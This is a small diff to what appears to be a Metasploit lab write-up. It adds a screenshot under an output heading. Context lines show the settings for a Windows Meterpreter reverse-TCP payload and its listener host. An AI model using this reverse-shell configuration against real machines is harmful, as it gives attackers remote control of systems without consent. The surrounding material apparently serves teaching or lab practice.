@@ -57,6 +57,8 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 
 ## OUTPUT:
+<img width="700" height="772" alt="image" src="https://github.com/user-attachments/assets/e075221e-5f27-45fb-ab8a-bc87d92aa9fc" />
+
 
 <img width="616" height="133" alt="image" src="https://github.com/user-attachments/assets/acaa30e1-b96b-44a2-af2b-a812915f7d79" />
 
